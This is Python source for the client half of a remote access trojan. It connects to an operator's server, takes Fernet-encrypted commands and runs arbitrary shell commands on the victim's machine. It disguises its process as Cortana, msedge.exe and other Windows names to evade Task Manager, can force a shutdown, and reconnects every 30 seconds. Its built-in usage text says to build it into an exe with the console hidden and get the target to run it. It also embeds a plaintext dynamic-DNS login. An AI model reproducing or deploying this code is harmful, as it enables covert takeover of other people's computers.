#Created:Mar2023  TimeTaken:Approx1week
#AdhritTheGreat
import time
try:
    import setproctitle
    import random
    import sys
    import socket
    import subprocess
    from cryptography.fernet import Fernet
    from termcolor import colored
    import os
    import requests#for get_ip function
except Exception as e:
    print("Major exception:\n")
    time.sleep(5)
    print(e,"\n\n")
    time.sleep(3)
    exit()

#Changing title of script to confuse Users who use taskmanager
list=['Cortana','msedge.exe','Cortana','Microsoft Edge','Desktop window manager','Registry','Windows Explorer']
title=random.choice(list)
time.sleep(9)
setproctitle.setproctitle(title)
x=setproctitle.getproctitle()
print("Renamed self into ",x)







terminal_accept=8192
HOST = '127.0.0.1'
PORT = 4004

key=b'kUYqncjdgReKii9W9XHzOE61t3IvD7XEmfANWZ2loJk='
fernet=Fernet(key)


# use this when creating the files option:
#output=colored("Commands-", "white", attrs=["bold"])+"\n"+colored("   help", "blue")+" -shows this banner\n"+colored("   dir", "blue")+" -shows all files that are in the directory where the script is running on the target\n"+colored("   type <filename>","blue")+" -prints a file on to the terminal "+colored("(Full path of file required in <filename>)\n","white",attrs=['bold'])+"      Thats all for now"
def rename_self():
    list=['Cortana','msedge.exe','Cortana (2)','Microsoft Edge (3)','Desktop window manager','Settings','Registry','Windows Explorer (2)']
    title=random.choice(list)
    time.sleep(9)
    setproctitle.setproctitle(title)
    x=setproctitle.getproctitle()
    print("Renamed self into ",x)
    return "Renamed self into:"+x
def get_ip():

    api_url = 'https://dynupdate.no-ip.com/nic/update'
    params = {
        'hostname': 'therat.ddns.net',
        'myip': 'detect',
    }
    auth = ('squiggle321', 'squiggle123@we')
    response = requests.get(api_url, params=params, auth=auth)
    ip_address = response.text.split()[-1]
    print(ip_address)
    return ip_address
def encrypt(message):
    encMessage = fernet.encrypt(message.encode())
    return encMessage
def decrypt(message):
    deMessage = fernet.decrypt(message).decode()
    return deMessage
def run_command(command):
    process = subprocess.run(command, shell=True, capture_output=True, text=True)
    output=process.stdout
    print(output)
    return str(output)
def clear():
    process = subprocess.run("cls", shell=True, capture_output=True, text=True)


while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((HOST, PORT))
            print(colored(f"Connected to {HOST}:{PORT}", "green"))
            print(" ")
            time.sleep(4)
            while True:
                encrypted_command = s.recv(4096)
                if not encrypted_command:
                    break
                command = str(decrypt(encrypted_command).strip())
                print(f"Received command from server: ",colored(command, "blue"),"\n")
                if 'help' in command and len(command)<5:
                    output=colored("Commands-", "white", attrs=["bold"])+"\n"+colored("   help", "blue")+"  -lists all commands\n"+colored("   info", "blue")+"  -about this program\n"+colored("   ip","blue")+"    -gives ip address of target\n"+colored("   cover","blue")+colored("(beta)","cyan")+" -script on target computer changes its name to prevent suspicion\n"+colored("   terminal", "blue")+colored("(beta)", "cyan")+" -runs all commands given after this command on a shell on the target system and gives back the output\n"+colored("   shutdown", "blue")+" -Shuts target computer down along with the code"+"\nUPCOMING:file-Browse and download files from target"
                elif 'info' in command and len(command)<5:
                    output="Created by"+colored(" Adhrit The Great\n","cyan")+colored("Use:","cyan")+"In client.py and server.py, edit the 'HOST' and 'PORT' variables, convert client.py to exe and make the target run it and run server.py in your computer (When converting client.py to exe,make sure you disable the shell opening)"
                elif 'ip' in command and len(command)<3:
                    try:
                        host_name = socket.gethostname()
                        ip=socket.gethostbyname(host_name)
                        output="Hostname:"+host_name+"\nIP:"+ip
                    except Exception as e:
                        output=colored("ERROR: "+e,"red")
                elif 'cover' in command and len(command)<6:
                    x=rename_self()
                    output=str(x.strip())
                elif 'banner' in command and len(command)<7:
                    output="ㅤ⠀"
                    # This will be handled by server
                elif command.lower()=='shutdown':
                    output="Shutting down...."
                    encrypted_output = encrypt(output)
                    s.sendall(encrypted_output)
                    print("Response sent: ",encrypted_output)
                    os.system("shutdown /s /t 1")
                elif 'terminal' in command and len(command)<9:
                    print("\n|Terminal mode started|\n")
                    #Open terminal and run and report the result back
                    try:
                        while True:
                            encrypted_output=""
                            out=""
                            encrypted_command = s.recv(terminal_accept)
                            if not encrypted_command:
                                break
                            command = str(decrypt(encrypted_command).strip())
                            if len(command)>terminal_accept:
                                output=colored("ERROR: Your command was too long and will not be run","red")
                                encrypted_output = encrypt(output)
                                s.sendall(encrypted_output)
                                print("Response sent: ",encrypted_output)
                                continue
                            print(f"Received terminal command from server: {command}")
                            if command.lower()=="leave":
                                output='\n|Terminal mode closed|\n'
                                break
                            elif command.lower()=='help':
                                #colored("(beta)", "cyan")+
                                output=colored("Commands-", "white", attrs=["bold"])+"\n"+colored("   help", "blue")+" -shows availible terminal commands\n"+colored("   shutdown", "blue")+" -Shuts target computer down along with the code"+colored(" (No arguments required)\n","white",attrs=["bold"])
                                encrypted_output = encrypt(output)
                                s.sendall(encrypted_output)
                                print("Response sent: ",encrypted_output)
                            elif 'cd' in command and len(command)<3:
                                out=run_command(command.strip())
                                output=str(out)
                                if len(output)<terminal_accept:
                                    print(output)
                                    encrypted_output = encrypt(output)
                                    s.sendall(encrypted_output)
                                    print("Response sent: ",encrypted_output)
                                elif len(output)>terminal_accept:
                                    output=colored("ERROR: Output given by your command was too long to transmit ","red")
                                    encrypted_output = encrypt(output)
                                    s.sendall(encrypted_output)
                                    print("Response sent: ",encrypted_output)
                            elif 'cd' in command and len(command)>3:
                                os.chdir(command.split()[1])
                                output=command.split()[1]
                                output=str(output)
                                if len(output)<terminal_accept:
                                    print(output)
                                    encrypted_output = encrypt(output)
                                    s.sendall(encrypted_output)
                                    print("Response sent: ",encrypted_output)
                                elif len(output)>terminal_accept:
                                    output=colored("ERROR: Output given by your command was too long to transmit ","red")
                                    encrypted_output = encrypt(output)
                                    s.sendall(encrypted_output)
                                    print("Response sent: ",encrypted_output)
                            else:
                                out=run_command(command)
                                output=str(out)
                                if len(output)<terminal_accept:
                                    print(output)
                                    encrypted_output = encrypt(output)
                                    s.sendall(encrypted_output)
                                    print("Response sent: ",encrypted_output)
                                elif len(output)>terminal_accept:
                                    output=colored("ERROR: Output given by your command was too long to transmit ","red")
                                    encrypted_output = encrypt(output)
                                    s.sendall(encrypted_output)
                                    print("Response sent: ",encrypted_output)

                    except Exception as e:
                        encrypted_output=""
                        output=colored("ERROR "+str(e),"red")
                        encrypted_output = encrypt(output)
                        s.sendall(encrypted_output)
                        print("Response sent: ",encrypted_output)
                    print("\n|Terminal mode closed|\n")
                    time.sleep(2)
                else:
                    output=colored("No command "+command,"red")
                encrypted_output = encrypt(output)
                s.sendall(encrypted_output)
                print("Response sent: ",encrypted_output)

            print("Connection closed,retrying every 30 seconds")

    except:
        print(colored("No server detected :(      [Retying in 30 sec]", "red"))
        time.sleep(30)
        continue
